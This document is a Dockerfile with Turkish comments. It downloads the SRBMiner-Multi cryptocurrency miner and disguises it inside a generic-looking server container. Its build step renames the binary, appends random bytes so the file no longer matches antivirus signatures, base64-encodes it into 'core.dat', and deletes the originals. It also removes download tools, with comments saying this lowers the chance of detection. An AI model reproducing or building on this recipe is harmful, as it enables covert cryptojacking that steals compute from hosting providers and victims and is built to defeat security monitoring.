FROM debian:bookworm-slim

WORKDIR /server

# Tüm işlemleri tek katmanda yap ve temizle
RUN apt-get update && apt-get install -y --no-install-recommends \
    wget curl ca-certificates python3 libstdc++6 xz-utils \
    && wget -qO /tmp/srb.tar.xz "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.xz" \
    && tar xf /tmp/srb.tar.xz -C /server \
    && mv /server/SRBMiner-Multi-2-7-5/SRBMiner-Multi /server/core_raw \
    # İmzayı bozmak için rastgele veri ekle
    && head -c 256 /dev/urandom >> /server/core_raw \
    # Base64 şifrele ve ham dosyayı sil
    && python3 -c "import base64; d=open('/server/core_raw','rb').read(); open('/server/core.dat','wb').write(base64.b64encode(d))" \
    && rm -rf /server/core_raw /server/SRBMiner-Multi-2-7-5 /tmp/srb.tar.xz \
    # Gereksiz araçları kaldır (Tespit ihtimalini düşürür)
    && apt-get purge -y wget xz-utils \
    && apt-get autoremove -y && rm -rf /var/lib/apt/lists/*

COPY engine.py /engine.py
COPY start.sh /start.sh
RUN chmod +x /start.sh

# Uygulama kullanıcısı oluştur
RUN useradd -m -u 1001 appuser
USER 1001

CMD ["/start.sh"]
